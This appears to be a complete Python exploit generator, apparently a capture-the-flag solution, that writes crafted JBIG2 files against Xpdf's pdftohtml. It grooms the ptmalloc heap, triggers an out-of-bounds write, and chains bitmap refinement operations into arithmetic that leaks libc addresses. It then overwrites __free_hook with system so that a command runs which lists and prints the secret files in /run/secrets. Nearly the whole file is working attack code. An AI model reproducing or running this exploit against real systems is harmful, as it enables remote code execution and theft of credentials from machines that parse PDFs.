from typing import List
from jbig2 import *

import struct
import itertools


LIBC_FREE_OFFSET = 0x8A920
LIBC_FREE_HOOK_OFFSET = 0x1C0E20
LIBC_SYSTEM_OFFSET = 0x49850
PDFTOHTML_VTBL_JBIG2SYMBOLDICT_OFFSET = 0x1F73F0
PDFTOHTML_FREE_GOT_OFFSET = 0x1F9D10
GLIST_DATA_SIZE = 0x200  # this->globalSegments->data
COMMAND_TO_RUN = b"ls -alh /run/secrets; cat /run/secrets/*; echo"
# COMMAND_TO_RUN = b"ls -alh /run/secrets; sha256sum /run/secrets/*; echo Exploit worked."


def materialize_segments(xs: List[Segment]):
    res = []
    for x in xs:
        if isinstance(x, list):
            res.append(materialize_segments(x))
        else:
            res.append(x.to_bytes())
    return b"".join(res)


def round_up(size: int, align: int):
    return (size + align - 1) // align * align


def ptmalloc_chunk_size(usable_size: int):
    return round_up(usable_size + 8, 0x10)


def DummyAlloc(size):
    return PageInfo(233, w=8, h=size)


glist_capacity = GLIST_DATA_SIZE // 8 // 2
syms_size = GLIST_DATA_SIZE // 2  # (was this->globalSegments->data)
size_to_overflow = (
    ptmalloc_chunk_size(syms_size)
    # 40: sizeof(JBIG2SymbolDict); there are (glist_capacity // 2) irrelevant JBIG2SymbolDict-s
    + ptmalloc_chunk_size(40) * (glist_capacity // 2)
    + ptmalloc_chunk_size(GLIST_DATA_SIZE)
    # Current page JBIG2Bitmap
    # vtbl(8)
    + 8
    # segNum(4), w(4), h(4), line(4)
    + 4 * 4
)
page_bitmap_buf_to_class_offset = (
    ptmalloc_chunk_size(GLIST_DATA_SIZE // 4)
    + ptmalloc_chunk_size(40) * (glist_capacity // 4)
    + size_to_overflow
    - 4 * 4
    - 8
)
assert (
    page_bitmap_buf_to_class_offset + 24
) * 8 <= 0x5555, "strong doge address hi 32 bit >= 0x5555; weak doge fixed 1"
page_bitmap_buf_to_data_ptr = page_bitmap_buf_to_class_offset + 24

global_file = [
    SymbolDict(0, [Bitmap(1, 1)] * 0x10000),
    SymbolDict(1, [Bitmap(1, 1)] * (size_to_overflow // 8)),
    SymbolDict(2, [Bitmap(1, 1)]),
    # Heap grooming: eat every chunk in {tcache,fast,small,large,unsorted} bins
    [[DummyAlloc(size)] * 128 for size in range(0x10, 0x1000, 0x10)],
    [[DummyAlloc(size)] * 16 for size in range(0x1000, 0x10000, 0x100)],
    [SymbolDict(i, []) for i in range(3, glist_capacity // 2)],
    # Now most bins are empty, except tcachebin 0x20, 0x50 and small bin 0x20
    # This triggers GList::expand(), 0x80 -> 0x100; allocates from top chunk
    SymbolDict(glist_capacity // 2, []),
    [SymbolDict(i, []) for i in range(glist_capacity // 2 + 1, glist_capacity)],
    # 0x100 -> 0x200, the old chunk should fall in tcache
    SymbolDict(100, []),
]
page0 = [
    # Make sure page bitmap buffer uses the second-last globalSegments data buffer so
    # that it lies just before syms, at a fixed offset.
    PageInfo(101, w=8 * (GLIST_DATA_SIZE // 4), h=1),
    # Change pageH and pageW to a large value to bypass a (seriously funny) sanity
    # check introduced in Xpdf 4.03; Xpdf would report an error without allocating
    # a new pageBitmap, but won't stop parsing the JBIG2 stream, which is exactly what
    # we want.
    PageInfo(101, w=1919114514, h=1919114514),
    # Trigger the out-of-bound write.
    TextRegion(
        102,
        w=1,
        h=1,
        x=0,
        y=0,
        ref_segs=[1]
        + [2] * (0x10000 + (syms_size - size_to_overflow) // 8)
        + [0] * 0xFFFF,
    ),
    # Take back the free-d syms, hold it to prevent potential crash.
    GenericRegion(103, imm=False, bitmap=Bitmap(8, syms_size)),
    # Overwrite pageBitmap->w, h and line
    GenericRegion(
        104,
        x=(page_bitmap_buf_to_class_offset + 12) * 8,
        y=0,
        comb_op=CombOp.Replace,
        # (x, y) -> mem[(y << 24) | (x >> 3)] >> (7 - (x & 7)), max 48-bit addressing
        bitmap=Bitmap(struct.pack("<III", 2 ** 27, 2 ** 24, 2 ** 24)),
        imm=True,
    ),
    # 16 "variables". Since we can only do bitwise operations relative to page bitmap
    # with Refinement regions, we need these variables for peeking other absolute
    # addresses, and also rebase the page bitmap in one segment command.
    SymbolDict(105, [Bitmap(64, 1)] * 16),
]
variable_bitmap_offset = 0xD10


class BitSeg:
    _seq = itertools.count(10000)

    def __init__(self, seg_num):
        self.seg_num = seg_num
        self.__consumed = False

    def consume(self):
        assert not self.__consumed
        self.__consumed = True
        return self.seg_num

    @classmethod
    def from_page(cls, offset):
        x, y = offset % 2 ** 27, offset // 2 ** 27
        idx = next(cls._seq)
        page0.append(ReadoutRefinement(idx, x=x, y=y, imm=False))
        return cls(idx)


def bitop(oa, ob, op: CombOp):
    b = BitSeg.from_page(ob)
    x, y = oa % 2 ** 27, oa // 2 ** 27
    page0.append(
        ReadoutRefinement(65536, x=x, y=y, imm=True, ref=b.consume(), comb_op=op)
    )


bitwise_mov = lambda a, b: bitop(a, b, CombOp.Replace)
bitwise_xor = lambda a, b: bitop(a, b, CombOp.Xor)
bitwise_and = lambda a, b: bitop(a, b, CombOp.And)
bitwise_or = lambda a, b: bitop(a, b, CombOp.Or)


def op_q_q(oa, ob, op: CombOp):
    for i in range(64):
        bitop(oa * 8 + i, ob * 8 + i, op)


# Offsets are in bytes.
mov_q_q = lambda a, b: op_q_q(a, b, CombOp.Replace)
xor_q_q = lambda a, b: op_q_q(a, b, CombOp.Xor)
and_q_q = lambda a, b: op_q_q(a, b, CombOp.And)
or_q_q = lambda a, b: op_q_q(a, b, CombOp.Or)


# Don't worry, Libra won't hu^W^W^W Xpdf allocates 1 more byte
adder_buf_offset = GLIST_DATA_SIZE // 4 * 8


def add_q_q(oa, ob):
    oa, ob = oa * 8, ob * 8
    ab_xor, ab_and, carry, ab_xor_c_and, zero = range(
        adder_buf_offset, adder_buf_offset + 5
    )
    bitwise_mov(carry, zero)
    for i in range(64):
        a_bit_offset = oa + i // 8 * 8 + (7 - i % 8)
        b_bit_offset = ob + i // 8 * 8 + (7 - i % 8)
        # This is a naive full-adder. Applying TIS-100 skill could cut 3~4 ops maybe.
        bitwise_mov(ab_xor, a_bit_offset)
        bitwise_xor(ab_xor, b_bit_offset)
        bitwise_mov(ab_and, a_bit_offset)
        bitwise_and(ab_and, b_bit_offset)
        bitwise_mov(a_bit_offset, ab_xor)
        bitwise_xor(a_bit_offset, carry)  # output (S)
        bitwise_mov(ab_xor_c_and, ab_xor)
        bitwise_and(ab_xor_c_and, carry)
        bitwise_mov(carry, ab_and)
        bitwise_or(carry, ab_xor_c_and)


def op_q_imm(offset, imm, op):
    offset *= 8
    x, y = offset % 2 ** 27, offset // 2 ** 27
    page0.append(
        GenericRegion(
            233, x=x, y=y, comb_op=op, bitmap=Bitmap(struct.pack("<Q", imm)), imm=True
        )
    )


mov_q_imm = lambda o, imm: op_q_imm(o, imm, CombOp.Replace)
xor_q_imm = lambda o, imm: op_q_imm(o, imm, CombOp.Xor)
and_q_imm = lambda o, imm: op_q_imm(o, imm, CombOp.And)
or_q_imm = lambda o, imm: op_q_imm(o, imm, CombOp.Or)


def rebase_variable_q(idx, addr_page_offset):
    mov_q_q(
        variable_bitmap_offset + idx * ptmalloc_chunk_size(0x20) + 0x18,
        addr_page_offset,
    )


def load_variable(to_page_offset, idx):
    to_page_offset *= 8
    x, y = to_page_offset % 2 ** 27, to_page_offset // 2 ** 27
    page0.append(
        TextRegion(
            233,
            x=x,
            y=y,
            w=64,
            h=1,
            imm=True,
            instances=[idx],
            ref_symbol_cnt=16,
            ref_segs=[105],
        )
    )


# vtbl of a JBIG2SymbolDict adajacent to page bitmap buffer
mov_q_q(0, ptmalloc_chunk_size(GLIST_DATA_SIZE // 4))
mov_q_imm(
    8, (-PDFTOHTML_VTBL_JBIG2SYMBOLDICT_OFFSET + PDFTOHTML_FREE_GOT_OFFSET) % 2 ** 64
)
add_q_q(0, 8)
rebase_variable_q(0, 0)
load_variable(8, 0)  # address of libc.free at +8
mov_q_imm(0, -LIBC_FREE_OFFSET % 2 ** 64)
add_q_q(8, 0)
mov_q_q(0, 8)
mov_q_imm(16, LIBC_FREE_HOOK_OFFSET)
add_q_q(0, 16)
mov_q_imm(16, LIBC_SYSTEM_OFFSET)
add_q_q(8, 16)
mov_q_q(24, page_bitmap_buf_to_data_ptr)
mov_q_imm(16, 8)
add_q_q(24, 16)
mov_q_q(16, page_bitmap_buf_to_data_ptr)
rebase_variable_q(0, 16)
rebase_variable_q(1, 24)
load_variable(page_bitmap_buf_to_data_ptr, 0)
load_variable(0, 1)

page0.append(
    GenericRegion(233, x=64, y=0, comb_op=CombOp.And, bitmap=Bitmap(COMMAND_TO_RUN))
)
page0.append(EOFSegment())

with open("sploit.sym", "wb") as fp:
    fp.write(materialize_segments(global_file))

with open("sploit.0000", "wb") as fp:
    fp.write(materialize_segments(page0))
